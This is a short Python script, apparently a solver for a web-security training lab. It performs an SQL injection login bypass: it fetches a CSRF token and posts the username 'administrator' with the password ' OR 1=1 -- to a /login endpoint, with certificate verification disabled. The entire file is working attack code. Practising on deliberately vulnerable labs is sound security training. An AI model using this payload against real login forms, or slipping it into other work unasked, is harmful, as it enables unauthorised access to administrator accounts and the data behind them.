from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/login")
    s, csrf = get_csrf_token(url, proxies=proxies)

    data = {"csrf": csrf, "username": "administrator", "password": "' OR 1=1 --"}
    print_info(
        "Performing SQL injection attack by logging in with the following values:"
    )
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")
